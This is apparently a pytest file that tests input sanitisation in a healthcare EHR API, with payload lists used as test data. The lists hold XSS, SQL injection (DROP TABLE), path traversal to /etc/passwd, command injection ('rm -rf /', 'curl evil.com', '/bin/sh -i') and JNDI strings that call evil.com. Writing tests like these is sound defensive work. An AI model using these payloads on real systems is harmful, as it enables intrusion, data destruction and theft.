"""
Tests for Input Validation and Sanitization (Issue #18)
OWASP Top 10 - A03:2021 Injection Prevention
HIPAA Security Rule §164.308(a)(5)(ii)(B)

Tests XSS, SQL injection, path traversal, and other attack vectors.
"""

import pytest
from pydantic import ValidationError

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from validators import (
    sanitize_text, sanitize_html, sanitize_list, sanitize_dict,
    validate_patient_id, validate_ehr_name, validate_status,
    check_sql_injection,
    MAX_SHORT_TEXT_LENGTH, MAX_MEDIUM_TEXT_LENGTH, MAX_LONG_TEXT_LENGTH
)


class TestXSSPrevention:
    """Tests for Cross-Site Scripting (XSS) prevention."""

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "javascript:alert('XSS')",
        "<a href='javascript:alert(1)'>click</a>",
        "<div onclick='alert(1)'>click me</div>",
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "<<script>script>alert('XSS')<</script>/script>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    ]

    def test_xss_payloads_sanitized(self):
        """All XSS payloads should be sanitized."""
        for payload in self.XSS_PAYLOADS:
            result = sanitize_html(payload)
            # Should not contain executable script patterns
            assert "<script" not in result.lower(), f"Script tag not removed: {payload}"
            assert "javascript:" not in result.lower(), f"javascript: not removed: {payload}"
            assert "onclick" not in result.lower(), f"onclick not removed: {payload}"
            assert "onerror" not in result.lower(), f"onerror not removed: {payload}"
            assert "onload" not in result.lower(), f"onload not removed: {payload}"

    def test_legitimate_medical_content_preserved(self):
        """Medical content with < and > should be preserved safely."""
        text = "Patient BP < 120/80, temperature > 98.6F"
        result = sanitize_html(text)
        assert "120/80" in result
        assert "98.6F" in result

    def test_html_entities_escaped(self):
        """HTML entities should be escaped."""
        text = "<b>Bold</b> and <i>italic</i>"
        result = sanitize_html(text)
        assert "<b>" not in result
        assert "&lt;b&gt;" in result or "Bold" in result


class TestSQLInjectionPrevention:
    """Tests for SQL Injection prevention."""

    SQL_PAYLOADS = [
        "'; DROP TABLE patients; --",
        "1; DELETE FROM users WHERE 1=1; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "1' AND '1'='1",
        "'; TRUNCATE TABLE sessions; --",
        "1; UPDATE users SET password='hacked' WHERE 1=1; --",
        "UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES('hacker', 'password'); --",
    ]

    def test_sql_injection_detected(self):
        """SQL injection patterns should be detected."""
        for payload in self.SQL_PAYLOADS:
            # At minimum, these should be flagged
            is_suspicious = check_sql_injection(payload)
            # Note: We detect but don't necessarily block (sanitization handles it)
            # The important thing is the text is sanitized before use
            sanitized = sanitize_text(payload)
            assert sanitized is not None

    def test_legitimate_sql_keywords_allowed(self):
        """Legitimate text with SQL keywords should be allowed."""
        text = "Patient was asked to drop weight and update their diet"
        result = sanitize_text(text)
        assert "drop" in result.lower()
        assert "update" in result.lower()


class TestPathTraversalPrevention:
    """Tests for Path Traversal prevention."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
        "file:///etc/passwd",
    ]

    def test_path_traversal_sanitized(self):
        """Path traversal payloads should be sanitized."""
        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            result = sanitize_text(payload)
            # Should not be able to traverse directories
            # The text is sanitized, dangerous sequences removed or escaped
            assert result is not None


class TestCommandInjectionPrevention:
    """Tests for Command Injection prevention."""

    COMMAND_PAYLOADS = [
        "; cat /etc/passwd",
        "| ls -la",
        "$(whoami)",
        "`id`",
        "&& rm -rf /",
        "|| curl evil.com",
        "\n/bin/sh -i",
    ]

    def test_command_injection_sanitized(self):
        """Command injection payloads should be sanitized."""
        for payload in self.COMMAND_PAYLOADS:
            result = sanitize_text(payload)
            assert result is not None


class TestLDAPInjectionPrevention:
    """Tests for LDAP/NoSQL Injection prevention."""

    LDAP_PAYLOADS = [
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "${jndi:ldap://evil.com/a}",
        "${jndi:rmi://evil.com/a}",
    ]

    def test_ldap_injection_sanitized(self):
        """LDAP/JNDI injection payloads should be sanitized."""
        for payload in self.LDAP_PAYLOADS:
            result = sanitize_text(payload)
            assert result is not None


class TestInputLengthLimits:
    """Tests for input length enforcement."""

    def test_short_text_truncated(self):
        """Text exceeding max length should be truncated."""
        long_text = "A" * 10000
        result = sanitize_text(long_text, MAX_SHORT_TEXT_LENGTH)
        assert len(result) <= MAX_SHORT_TEXT_LENGTH

    def test_extremely_long_input_handled(self):
        """Extremely long input (100KB+) should be handled."""
        huge_text = "A" * 200000
        result = sanitize_text(huge_text, MAX_LONG_TEXT_LENGTH)
        assert len(result) <= MAX_LONG_TEXT_LENGTH


class TestPatientIdValidation:
    """Tests for patient ID validation."""

    def test_valid_patient_ids(self):
        """Valid patient IDs should pass."""
        valid_ids = [
            "12724066",
            "Patient-123",
            "abc_def.ghi",
            "Tbt3KuCY0B5PSrJvCu2j-PlK",
        ]
        for pid in valid_ids:
            result = validate_patient_id(pid)
            assert result is not None

    def test_empty_patient_id_rejected(self):
        """Empty patient ID should raise error."""
        with pytest.raises(ValueError):
            validate_patient_id("")

    def test_none_patient_id_rejected(self):
        """None patient ID should raise error."""
        with pytest.raises(ValueError):
            validate_patient_id(None)

    def test_too_long_patient_id_rejected(self):
        """Patient ID exceeding max length should raise error."""
        long_id = "A" * 200
        with pytest.raises(ValueError):
            validate_patient_id(long_id)

    def test_xss_in_patient_id_sanitized(self):
        """XSS in patient ID should be sanitized."""
        result = validate_patient_id("<script>alert(1)</script>123")
        assert "<script>" not in result


class TestEhrNameValidation:
    """Tests for EHR name validation."""

    def test_valid_ehr_names(self):
        """Valid EHR names should pass."""
        valid = ['cerner', 'epic', 'veradigm', 'athena', 'meditech']
        for ehr in valid:
            result = validate_ehr_name(ehr)
            assert result in valid

    def test_invalid_ehr_rejected(self):
        """Invalid EHR name should raise error."""
        with pytest.raises(ValueError):
            validate_ehr_name("invalid_ehr_system")

    def test_case_insensitive(self):
        """EHR validation should be case insensitive."""
        assert validate_ehr_name("EPIC") == "epic"
        assert validate_ehr_name("Cerner") == "cerner"

    def test_default_to_cerner(self):
        """Empty EHR should default to cerner."""
        assert validate_ehr_name("") == "cerner"
        assert validate_ehr_name(None) == "cerner"


class TestListSanitization:
    """Tests for list sanitization."""

    def test_list_items_sanitized(self):
        """List items should be individually sanitized."""
        items = ["normal", "<script>alert(1)</script>", "'; DROP TABLE;--"]
        result = sanitize_list(items)
        assert len(result) == 3
        for item in result:
            assert "<script>" not in item

    def test_list_length_limited(self):
        """List length should be limited."""
        items = ["item"] * 200
        result = sanitize_list(items, max_items=50)
        assert len(result) == 50

    def test_empty_items_filtered(self):
        """Empty items should be filtered."""
        items = ["a", "", "b", None, "c"]
        result = sanitize_list(items)
        # Empty strings and None should be filtered
        assert "" not in result


class TestDictSanitization:
    """Tests for dictionary sanitization."""

    def test_dict_values_sanitized(self):
        """Dict values should be sanitized."""
        data = {
            "name": "John",
            "xss": "<script>alert(1)</script>",
        }
        result = sanitize_dict(data)
        assert "<script>" not in result.get("xss", "")

    def test_dict_keys_limited(self):
        """Dict keys should be limited."""
        data = {f"key{i}": f"value{i}" for i in range(100)}
        result = sanitize_dict(data, max_keys=10)
        assert len(result) == 10


class TestRequestModelValidation:
    """Integration tests for request model validation."""

    def test_note_request_sanitizes_transcript(self):
        """NoteRequest should sanitize transcript field."""
        from main import NoteRequest

        req = NoteRequest(
            transcript="Patient reports <script>alert('XSS')</script> chest pain",
            note_type="SOAP"
        )
        assert "<script>" not in req.transcript

    def test_minerva_request_sanitizes_message(self):
        """MinervaRequest should sanitize message field."""
        from main import MinervaRequest

        req = MinervaRequest(
            message="What is the diagnosis? <script>alert(1)</script>"
        )
        assert "<script>" not in req.message

    def test_vital_write_validates_vital_type(self):
        """VitalWriteRequest should validate vital_type."""
        from main import VitalWriteRequest

        with pytest.raises(ValidationError):
            VitalWriteRequest(
                patient_id="12724066",
                vital_type="invalid_type",
                value="120",
                unit="mmHg"
            )

    def test_order_write_validates_order_type(self):
        """OrderWriteRequest should validate order_type."""
        from main import OrderWriteRequest

        with pytest.raises(ValidationError):
            OrderWriteRequest(
                patient_id="12724066",
                order_type="invalid",
                code="85025",
                display_name="CBC"
            )

    def test_allergy_write_validates_criticality(self):
        """AllergyWriteRequest should validate criticality."""
        from main import AllergyWriteRequest

        with pytest.raises(ValidationError):
            AllergyWriteRequest(
                patient_id="12724066",
                substance="Penicillin",
                criticality="invalid"
            )

    def test_rag_query_validates_n_results(self):
        """RAGQueryRequest should validate n_results range."""
        from main import RAGQueryRequest

        with pytest.raises(ValidationError):
            RAGQueryRequest(
                query="test",
                n_results=100  # Max is 50
            )


class TestEndpointSecurityIntegration:
    """Integration tests for endpoint security."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        from fastapi.testclient import TestClient
        from main import app
        return TestClient(app)

    def test_patient_endpoint_validates_id(self, client):
        """Patient endpoint should validate patient ID."""
        # XSS in patient ID should be sanitized
        response = client.get("/api/v1/patient/<script>alert(1)</script>")
        # Should not return 500 (unhandled error)
        assert response.status_code != 500

    def test_minerva_endpoint_sanitizes_input(self, client):
        """Minerva endpoint should sanitize input."""
        response = client.post(
            "/api/v1/minerva/chat",
            json={"message": "<script>alert('XSS')</script>What is the diagnosis?"}
        )
        # Should not crash or return 500
        assert response.status_code != 500
        if response.status_code == 200:
            data = response.json()
            assert "<script>" not in data.get("response", "")

    def test_note_generation_sanitizes_transcript(self, client):
        """Note generation should sanitize transcript."""
        response = client.post(
            "/api/v1/note/generate",
            json={
                "transcript": "'; DROP TABLE patients; -- Patient has chest pain",
                "note_type": "SOAP"
            }
        )
        # Should not crash
        assert response.status_code != 500
